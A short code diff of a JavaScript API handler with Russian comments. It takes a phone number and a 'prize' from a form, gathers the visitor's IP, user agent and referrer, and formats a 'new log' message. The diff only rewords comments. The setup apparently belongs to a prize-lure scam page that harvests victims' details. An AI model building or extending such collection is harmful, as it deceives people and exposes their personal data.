@@ -6,14 +6,14 @@ export default async function handler(req, res) {
   try {
     const { phone, prize } = req.body;
 
-    // Доп. инфа
+    // Собираем доп. инфу
     const ip =
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket.remoteAddress;
     const ua = req.headers["user-agent"] || "Неизвестно";
     const ref = req.headers["referer"] || "Прямой заход";
 
-    // Форматируем сообщение
+    // Формируем сообщение
     const text = `✅ Новый лог
 📞 Номер: ${phone || "—"}
 🎁 Приз: ${prize || "—"}
